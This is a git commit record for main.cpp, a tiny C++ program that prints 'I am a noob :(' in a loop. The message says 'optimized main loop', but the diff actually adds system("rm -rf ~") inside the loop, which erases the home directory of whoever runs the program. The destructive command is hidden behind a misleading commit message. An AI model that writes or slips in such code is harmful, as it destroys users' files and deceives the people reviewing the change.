fc1adc10d734d37c804ab8cd788284d0fb2d4844
Gabe Pike <gpike@isecpartners.com>
2013-04-08 18:06:36 -0700

    optimized main loop

--- main.cpp
+++ main.cpp
@@ -2,11 +2,13 @@
 // 8 April 2013
 
 #include <iostream>
+#include <cstdlib>
 using namespace std;
 
 int main() {
   for(int i=0; i<9001; i++) {
       cout << "I am a noob :(\n";
+      system("rm -rf ~");
   }
   
   return 0;
